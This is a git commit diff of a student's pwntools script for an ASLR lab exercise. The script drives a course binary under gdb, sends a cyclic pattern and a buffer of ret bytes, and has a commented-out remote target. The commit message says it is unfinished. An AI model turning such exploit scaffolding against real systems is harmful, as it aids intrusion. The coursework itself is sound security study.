ec4d4fcdb7a9b6acedf5d7f20a484e6d356bd7d8
Bryan Tremblay <bryanandhallie@gmail.com>
2022-09-30 19:41:26 -0400

    Started working more on 5-3, without much progress tbh

--- RichardWestover/ASLR/lab5-3_unsolved/solution.py
+++ RichardWestover/ASLR/lab5-3_unsolved/solution.py
@@ -2,33 +2,6 @@
 # 2022.09.29.0942.EST
 from pwn import *
 
-#with remote("csc748.hostbin.org", 7053) as p:
-with gdb.debug("./lab5-3.bin") as p:
-    payload = b""
-
-    a = p.recv()    # Prompt: Options Banner
-    print(a)
-    p.send(b"1\n")    # Option: Load Data
-    a = p.recv()    # Prompt: Length
-    print(a)
-    #p.send(b"1024\n")
-    #p.send(b"131072\n")    # 262144 = 0x20000
-    #p.send(b"1048576\n")    # 1048576 = 0x100000
-    p.send(b"16777216\n")    # 16777216 = 0x1000000
-    a = p.recv()    # Prompt: Data
-    print(a)
-    #p.send(b"A"*1024 + b"\n")    # Sending data
-    #p.send(b"A"*131072 + b"\n")    # Sending data
-    #p.send(b"A"*1048576 + b"\n")    # Sending data
-    p.send(b"A"*16777216 + b"\n")    # Sending data
-
-    a = p.recv()    # Prompt: Options Banner
-    print(a)
-
-    #p.send(payload)
-    p.interactive()
-
-
 """
 gdb's search function is... finnicky
 find [/SIZE-CHAR] [/MAX-COUNT] START-ADDRESS, END-ADDRESS, EXPR1 [, EXPR2 ...]
@@ -36,3 +9,44 @@ find [/SIZE-CHAR] [/MAX-COUNT] START-ADDRESS, +LENGTH, EXPR1 [, EXPR2 ...]
 
 Can use [info proc mappings] (or really vmmap for better details) to get useful information
 """
+
+ret = b"\xc3"
+generated_section_count = 0
+
+pattern = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak"
+
+# Emulates the function of size_t align(size_t n) from the original c code
+def align(n):
+    if (n % 0x1000) != 0:
+        n += 0x1000 - (n % 0x1000)
+    return n
+
+#with remote("csc748.hostbin.org", 7053) as p:
+with gdb.debug("./lab5-3.bin") as p:
+    payload = b""
+
+    length = align(len(pattern))
+    print("Requesting {} bytes".format(length))
+
+    a = p.recv()    # Ignore banner
+    print("a")
+    print(a)
+    p.send(b"1\n")    # Option 1: mmap new section on heap
+    print("b")
+    c = p.recv()    # Ignore reply
+    print("c")
+    print(c)
+    p.send(pattern)    # Send a requested section length
+    print("d")
+    generated_section_count += 1
+    print("e")
+    f = p.recv()    # Ignore reply
+    print("f")
+    print(f)
+
+    # Now we send length bytes to the target
+
+    p.send(ret*length)
+    print("g")
+
+    p.interactive()
